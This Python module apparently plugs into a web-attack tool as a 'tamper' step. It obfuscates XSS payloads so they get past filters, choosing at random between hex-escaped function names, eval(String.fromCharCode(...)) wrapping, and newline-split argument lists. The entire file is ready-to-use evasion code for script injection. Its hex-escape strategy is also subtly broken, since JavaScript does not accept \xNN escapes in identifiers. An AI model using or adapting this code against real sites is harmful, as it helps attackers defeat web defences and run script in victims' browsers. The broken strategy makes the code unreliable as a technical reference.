import random
import re

__example_payload__ = '<script>alert("XSS");</script>'
__type__ = "obfuscate JavaScript: hex-escaped identifiers, eval(fromCharCode), or newline-split arguments"
__category__ = "xss"
__chain_stage__ = "lexical"
__contexts__ = ("html", "attribute")

# Reserved words that must not be renamed, even in an escaped form.
_JS_KEYWORDS = frozenset({
    "if", "else", "for", "while", "do", "switch", "case", "default",
    "function", "return", "var", "let", "const", "new", "typeof", "in",
    "of", "delete", "void", "this", "true", "false", "null", "undefined",
})

_CALL_IDENT = re.compile(r"\b([A-Za-z_$][\w$]*)\s*(?=\()")
_CALL_TEXT = re.compile(r"\b[A-Za-z_$][\w$]*\([^()]*\)")


def _hex_escape(word):
    return "".join("\\x{:02x}".format(ord(char)) for char in word)


def _obfuscate_ident(match):
    word = match.group(1)
    if word.lower() in _JS_KEYWORDS:
        return word
    return _hex_escape(word)


def _to_from_charcode(match):
    codes = ",".join(str(ord(char)) for char in match.group(0))
    return "eval(String.fromCharCode({}))".format(codes)


def tamper(payload, **kwargs):
    if not payload:
        return payload

    strategy = kwargs.get("strategy", -1)
    if strategy == -1:
        strategy = random.randrange(3)

    if strategy == 0:
        # alert(1) -> \x61\x6c\x65\x72\x74(1)
        return _CALL_IDENT.sub(_obfuscate_ident, payload)
    if strategy == 1:
        # alert(1) -> eval(String.fromCharCode(97,108,...))
        return _CALL_TEXT.sub(_to_from_charcode, payload)
    # strategy 2: split the argument list with a newline so "alert(1)" is never contiguous
    return re.sub(r"(\([^()]*\))", lambda m: m.group(0).replace("(", "(\n").replace(")", "\n)"), payload)
